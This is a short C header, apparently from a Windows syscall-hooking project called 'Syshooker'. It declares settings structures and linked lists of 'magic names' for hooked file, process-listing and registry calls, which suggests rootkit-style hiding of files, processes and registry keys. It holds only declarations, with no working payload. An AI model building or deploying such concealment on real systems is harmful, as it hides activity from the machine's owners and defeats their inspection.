#pragma once
#define SYSHOOKER_SYSTEM_INFORMATION_CLASS_PROCESS 5 // defined in 'ntint.h'

struct SyshookerSettings {
	wchar_t NtCreateFileMagicName[MAX_PATH_SYSHOOKER];
	wchar_t NtWriteFileMagicName[MAX_PATH_SYSHOOKER];
	wchar_t NtQueryDirectoryFileExMagicName[MAX_PATH_SYSHOOKER];
	wchar_t NtQuerySystemInformationProcessMagicName[MAX_PATH_SYSHOOKER];
	wchar_t RegistryKeyMagicName[MAX_PATH_SYSHOOKER];
};
extern SyshookerSettings Settings;

typedef struct NameNode {
	struct NameNode* Next;
	wchar_t* NameBuffer; // ensure that this is zero-terminated!
	size_t NameLength;
};

struct SyshookerSettingsNew {
	NameNode* FileMagicNamesHead;
	NameNode* ProcessMagicNamesHead;
	NameNode* RegistryMagicNamesHead;
};
extern SyshookerSettingsNew SettingsNew;